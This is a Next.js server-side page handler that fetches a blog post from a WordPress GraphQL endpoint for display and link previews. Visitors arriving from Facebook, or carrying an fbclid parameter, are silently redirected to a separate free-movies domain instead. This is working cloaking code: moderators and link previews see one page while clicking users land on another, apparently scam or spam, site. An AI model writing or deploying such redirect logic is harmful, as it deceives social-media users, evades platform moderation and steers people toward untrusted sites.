import { GetServerSideProps } from 'next';
import { GraphQLClient, gql } from 'graphql-request';

export const getServerSideProps: GetServerSideProps = async (ctx) => {
  try {
    const endpoint = "http://cryptoinfo.ulti.eu.org/graphql";
    const graphQLClient = new GraphQLClient(endpoint);
    const referringURL = ctx.req.headers?.referer || null;
    const pathArr = ctx.query.postpath as string[];
    const path = pathArr.join('/');
    console.log(path);
    const fbclid = ctx.query.fbclid;

    // Redirect if Facebook is the referrer or request contains fbclid
    if (referringURL?.includes('facebook.com') || fbclid) {
      return {
        redirect: {
          permanent: false,
          destination: `https://www.bestmoviesfree.tk/2023/05/window.html`,
        },
      };
    }

    const query = gql`
      query GetPost($path: String!) {
        post(id: $path, idType: URI) {
          id
          excerpt
          title
          link
          dateGmt
          modifiedGmt
          content
          author {
            node {
              name
            }
          }
          featuredImage {
            node {
              sourceUrl
              altText
            }
          }
        }
      }
    `;

    const variables = {
      path: `/${path}/`,
    };

    const data = await graphQLClient.request(query, variables);
    
    if (!data.post) {
      return {
        notFound: true,
      };
    }

    return {
      props: {
        path,
        post: data.post,
        host: ctx.req.headers.host || '',
      },
    };
  } catch (error) {
    console.error('Internal Server Error:', error);

    return {
      notFound: true,
    };
  }
};
